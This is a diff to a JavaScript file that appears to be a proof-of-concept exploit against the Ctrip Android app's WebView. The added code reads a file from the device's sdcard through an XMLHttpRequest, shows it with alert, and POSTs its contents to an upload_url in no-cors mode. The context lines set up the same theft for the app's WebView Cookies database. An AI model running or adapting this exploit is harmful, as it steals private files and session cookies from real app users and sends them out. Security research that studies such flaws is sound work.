@@ -9,7 +9,32 @@ if(window._VideoEnabledWebView == undefined){
 
 
 }else{
-//var full_theft_file_url = "sdcard://www.ctrip.com" + theft_file;
+var full_theft_file_url = "sdcard://www.ctrip.com" + theft_file;
+var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function() {
+  if (xhr.readyState == XMLHttpRequest.DONE) {
+     alert(xhr.responseText);
+    var form_data = new FormData();
+    form_data.append("uploadfile", xhr.responseText);
+    fetch(upload_url, {
+        method: 'POST',
+        body: form_data,
+        mode: 'no-cors'
+    })
+    .then(response => {
+        if (response.ok) {
+            // Handle successful response if needed
+            console.log('Request succeeded with status', response.status);
+        } else {
+            // Handle errors if needed
+            console.error('Request failed with status', response.status);
+        }
+    })
+  }
+}
+xhr.open('GET', full_theft_file_url, true);
+xhr.send(null);
+
 var full_theft_file_url = "webx://local_resource/data/data/ctrip.android.view/app_webview/Default/Cookies";
 var xhr = new XMLHttpRequest();
 xhr.onreadystatechange = function() {
